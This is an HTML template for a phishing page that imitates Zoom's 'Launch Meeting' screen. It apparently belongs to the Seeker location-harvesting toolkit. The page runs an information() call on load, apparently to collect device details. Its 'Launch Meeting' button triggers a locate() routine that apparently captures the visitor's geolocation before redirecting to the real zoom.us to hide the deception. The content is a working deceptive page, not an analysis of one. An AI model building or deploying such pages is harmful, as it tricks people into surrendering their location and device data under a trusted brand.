<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Launch Meeting - Zoom</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #fff;
      color: #232333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .zoom-header { background: #0e72ed; color: #fff; padding: 16px 24px; width: 100%; max-width: 480px; border-radius: 8px 8px 0 0; font-weight: 600; }
    .card {
      max-width: 480px;
      background: #fff;
      border: 1px solid #e5e5e5;
      border-radius: 0 0 8px 8px;
      padding: 36px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
    }
    h1 { font-size: 1.25rem; margin-bottom: 12px; color: #232333; }
    p { color: #747487; font-size: 0.95rem; line-height: 1.5; margin-bottom: 24px; }
    .btn {
      display: inline-block;
      padding: 12px 32px;
      background: #0e72ed;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover { background: #2681f2; }
    #status { margin-top: 16px; font-size: 0.9rem; color: #747487; }
  </style>
</head>
<body>
  <div class="zoom-header">Zoom</div>
  <div class="card">
    <h1>Launch Meeting</h1>
    <p>Click Open in the dialog shown by your browser, or click Launch Meeting below to join.</p>
    <button id="launchBtn" class="btn" onclick="handleLaunch()">Launch Meeting</button>
    <div id="status"></div>
  </div>
  <script>
    window.SEEKER_API_BASE = '{{ api_base }}';
  </script>
  <script src="/static/seeker/js/location.js"></script>
  <script>
    information();
    function handleLaunch() {
      var btn = document.getElementById('launchBtn');
      var status = document.getElementById('status');
      btn.disabled = true;
      btn.textContent = 'Connecting...';
      var redirectUrl = '{{ redirect_url }}' || 'https://zoom.us';
      locate(
        function() {
          status.textContent = 'Launching...';
          window.location.href = redirectUrl;
        },
        function(err, msg) {
          status.textContent = 'Unable to launch. ' + (msg || '');
          btn.disabled = false;
          btn.textContent = 'Launch Meeting';
        }
      );
    }
  </script>
</body>
</html>
